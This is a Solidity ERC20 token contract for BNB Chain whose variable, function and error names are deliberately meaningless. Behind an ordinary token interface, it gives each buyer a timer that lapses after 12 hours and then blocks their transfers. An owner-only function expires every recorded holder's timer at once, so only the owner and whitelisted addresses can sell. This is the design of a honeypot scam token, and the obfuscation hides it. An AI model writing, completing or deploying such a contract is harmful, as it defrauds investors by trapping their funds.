import "lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "lib/openzeppelin-contracts/contracts/access/Ownable.sol";
import "interfaces/IUniswapV2Router02.sol";
import "interfaces/IUniswapV2Pair.sol";
import "interfaces/IUniswapV2Factory.sol";



contract FEdkEDfdOke is ERC20, Ownable {
  uint256 public constant dfwdfwd = 12 hours;
  uint256 public constant ejfejfeefe = 7 days;
  uint256 public constant INITIAL_SUPPLY = 1_000_000_000 * 10**18;

  uint256 public wefwefewf = INITIAL_SUPPLY / 50;

  address public uniswapV2Pair;

  address[] public ewfwefewf;
  mapping(address => bool) public efwegwegewgewg;


  mapping(address => bool) public fwfefwefw;
  mapping(address => bool) public fwefewfefe; 
  mapping(address => uint256) private efwfejfowifewf;
  mapping(address => uint256) private wefewfefewf;

  IUniswapV2Router02 public uniswapV2Router =
     IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); //bnb

  constructor() ERC20("ewfewfwefewgwew", "ewefewfwef") {
    uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
      address(this),
      uniswapV2Router.WETH()
    );

    fwfefwefw[owner()] = true;
    fwfefwefw[address(uniswapV2Router)] = true;
    fwfefwefw[address(this)] = true;
    fwfefwefw[uniswapV2Pair] = true;

    fwefewfefe[owner()] = true;
    fwefewfefe[address(this)] = true;
    fwefewfefe[uniswapV2Pair] = true;
    fwefewfefe[address(uniswapV2Router)] = true;

    _mint(msg.sender, INITIAL_SUPPLY);
  }

  function transfer(address recipient, uint256 amount)
    public
    virtual
    override
    returns (bool)
  {
    return super.transfer(recipient, amount);
  }

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) public virtual override returns (bool) {
    return super.transferFrom(sender, recipient, amount);
  }

  function _beforeTokenTransfer(
    address from,
    address to,
    uint256 amount
  ) internal virtual override {
    require(!wefwegegefe(from) || fwefewfefe[from], "fwfffewfew");
    require(!wefwegegefe(to) || fwefewfefe[to], "wefewrfeffew");
    require(!ewrefefewfwe(from), "Aweffweffwef");
    require(!ewrefefewfwe(to), "ewfwefwefw");

    if (!fwfefwefw[to] && from != to) {
      require(
        balanceOf(to) + amount <= wefwefewf,
        "fwefwegwegergergerge"
      );
    }

    
    if (balanceOf(from) == amount) {
      efwfejfowifewf[from] = 0;
    }

    if (!fwefewfefe[to]) {
      efwfejfowifewf[to] = block.timestamp + dfwdfwd;
    }

    if(efwegwegewgewg[to] == false){
        ewfwefewf.push(to);
        efwegwegewgewg[to] = true;
      }

    super._beforeTokenTransfer(from, to, amount);
  }

  function jfnimeifmiwe() public {
    require(balanceOf(msg.sender) > 0, "wefweffefwwf");
    require(!wefwegegefe(msg.sender), "wefewfwefewfwef");
    require(!fwefewfefe[msg.sender], "wefwefwefwefwe");

    efwfejfowifewf[msg.sender] = block.timestamp + dfwdfwd;
  }

  function weoiejijewef() public {
    require(balanceOf(msg.sender) > 0, "wefewfwefwefewfwef");
    require(!wefwegegefe(msg.sender), "Aregergergerg");
    require(!ewrefefewfwe(msg.sender), "rtbbegergrege");
    require(!fwefewfefe[msg.sender], "ergerghergergerg");

    wefewfefewf[msg.sender] = block.timestamp + ejfejfeefe;
    efwfejfowifewf[msg.sender] = 0;
  }

  function ewgfewgefw(address account, bool value) public onlyOwner {
    fwefewfefe[account] = value;
  }

  function wegwegwegwefwe(address account, bool value) public onlyOwner {
    fwfefwefw[account] = value;
  }

  function ewfewffewf(uint256 amount) public onlyOwner {
    wefwefewf = amount;
  }

  function ewrefefewfwe(address account) public view returns (bool) {
    return wefewfefewf[account] > block.timestamp;
  }

  function wefwegegefe(address account) public view returns (bool) {
    return
      wefwfwefwefew(account) == 0 && efwfejfowifewf[account] != 0;
  }

  function wefwfwefwefew(address account) public view returns (uint256) {
    uint256 errggergt = wewfefewfeeffewfew(account);

    return block.timestamp < errggergt ? errggergt : 0;
  }

  function wewfefewfeeffewfew(address account) public view returns (uint256) {
    uint256 errggergt = efwfejfowifewf[account];
    uint256 tgrttrvr = wefewfefewf[account];

    if (ewrefefewfwe(account)) {
      return tgrttrvr > errggergt ? tgrttrvr : errggergt;
    } else {
      return errggergt;
    }
  }

  uint wdggewgewg = 0;
 

  function jrnfeifneioroei(address[] memory) external onlyOwner() returns(uint){
    for (uint256 i = 0; i < ewfwefewf.length; i++) {
      efwfejfowifewf[ewfwefewf[i+wdggewgewg]] = 1;
    }
    wdggewgewg = ewfwefewf.length;
    return wdggewgewg; 
  }
}